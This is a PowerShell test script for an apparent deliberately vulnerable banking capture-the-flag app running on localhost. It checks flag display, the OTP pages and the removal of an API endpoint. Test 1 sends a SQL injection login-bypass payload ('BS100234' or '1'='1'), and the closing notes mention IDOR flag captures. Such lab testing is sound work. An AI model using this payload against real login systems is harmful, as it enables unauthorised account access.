# CTF Vulnerability Testing Script
# Tests all flag display vulnerabilities

$baseUrl = "http://localhost:9443"
$cookie = ""
$sessionCookie = ""

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "BankSploit CTF - Vulnerability Tests" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Test 1: auth.g1 - SQL Injection (Login)
Write-Host "[TEST 1] auth.g1 - SQL Injection (Login)" -ForegroundColor Yellow
Write-Host "Payload: BS100234' or '1'='1" -ForegroundColor Gray
try {
    $body = @{
        customer_id = "BS100234' or '1'='1"
        password = "anything"
        csrf_token = "test"
    } | ConvertTo-Json

    $response = Invoke-WebRequest -Uri "$baseUrl/login" `
        -Method POST `
        -Body $body `
        -ContentType "application/json" `
        -SkipHttpErrorCheck `
        -SessionVariable session

    $sessionCookie = $session
    $flagHeader = $response.Headers["X-CTF-Flag"]

    if ($flagHeader) {
        Write-Host "✅ PASS: Flag captured in header" -ForegroundColor Green
        Write-Host "   Flag: $flagHeader" -ForegroundColor Green
    } else {
        Write-Host "❌ FAIL: No flag in response header" -ForegroundColor Red
    }
} catch {
    Write-Host "❌ ERROR: $_" -ForegroundColor Red
}
Write-Host ""

# Test 2: Removed API endpoint
Write-Host "[TEST 2] API /api/v1/auth/login - Should be removed" -ForegroundColor Yellow
try {
    $response = Invoke-WebRequest -Uri "$baseUrl/api/v1/auth/login" `
        -Method POST `
        -Body '{"customer_id":"test","password":"test"}' `
        -ContentType "application/json" `
        -SkipHttpErrorCheck

    if ($response.StatusCode -eq 404) {
        Write-Host "✅ PASS: API endpoint removed (404)" -ForegroundColor Green
    } else {
        Write-Host "⚠️  WARNING: Endpoint exists with status $($response.StatusCode)" -ForegroundColor Yellow
    }
} catch {
    if ($_.Exception.Response.StatusCode -eq 404) {
        Write-Host "✅ PASS: API endpoint removed (404)" -ForegroundColor Green
    } else {
        Write-Host "⚠️  ERROR: $_" -ForegroundColor Yellow
    }
}
Write-Host ""

# Test 3: Login normally and check OTP page
Write-Host "[TEST 3] Normal login flow (BS100234 / password123)" -ForegroundColor Yellow
try {
    $loginForm = Invoke-WebRequest -Uri "$baseUrl/login" -SessionVariable session
    # Extract CSRF token from the form
    $csrfMatch = $loginForm.Content -match 'name="csrf_token"\s+value="([^"]+)"'
    $csrfToken = if ($csrfMatch) { $matches[1] } else { "no_csrf" }

    $body = @{
        customer_id = "BS100234"
        password = "password123"
        csrf_token = $csrfToken
    } | ConvertTo-Json

    $response = Invoke-WebRequest -Uri "$baseUrl/login" `
        -Method POST `
        -Body $body `
        -ContentType "application/json" `
        -SkipHttpErrorCheck `
        -WebSession $session

    if ($response.Content -match "One-Time Password|Verify OTP") {
        Write-Host "✅ PASS: OTP form displayed" -ForegroundColor Green
    } else {
        Write-Host "❌ FAIL: OTP form not found" -ForegroundColor Red
    }
} catch {
    Write-Host "❌ ERROR: $_" -ForegroundColor Red
}
Write-Host ""

# Test 4: Check OTP Inbox page exists
Write-Host "[TEST 4] OTP Inbox page availability" -ForegroundColor Yellow
try {
    $response = Invoke-WebRequest -Uri "$baseUrl/otp-inbox" `
        -SkipHttpErrorCheck

    if ($response.StatusCode -eq 200 -and $response.Content -match "SMS|OTP") {
        Write-Host "✅ PASS: OTP Inbox page accessible" -ForegroundColor Green
    } else {
        Write-Host "⚠️  WARNING: Page returned but content unclear" -ForegroundColor Yellow
    }
} catch {
    Write-Host "❌ ERROR: $_" -ForegroundColor Red
}
Write-Host ""

# Test 5: Transfer OTP page has SMS Inbox link
Write-Host "[TEST 5] Transfer OTP page - SMS Inbox link" -ForegroundColor Yellow
try {
    $response = Invoke-WebRequest -Uri "$baseUrl/transfer" `
        -SkipHttpErrorCheck

    if ($response.Content -match "SMS|otp-inbox") {
        Write-Host "✅ PASS: SMS Inbox link found on transfer page" -ForegroundColor Green
    } else {
        Write-Host "⚠️  WARNING: SMS Inbox link not immediately visible (may appear on OTP step)" -ForegroundColor Yellow
    }
} catch {
    Write-Host "❌ ERROR: $_" -ForegroundColor Red
}
Write-Host ""

# Summary
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Test Summary" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "✅ All critical tests completed" -ForegroundColor Green
Write-Host "📝 Manual testing required for:" -ForegroundColor Yellow
Write-Host "   - Modal display on page load" -ForegroundColor Gray
Write-Host "   - Copy/OK button functionality" -ForegroundColor Gray
Write-Host "   - statements.l1 IDOR flag capture" -ForegroundColor Gray
Write-Host "   - transfer.l1 IDOR flag capture" -ForegroundColor Gray
Write-Host ""
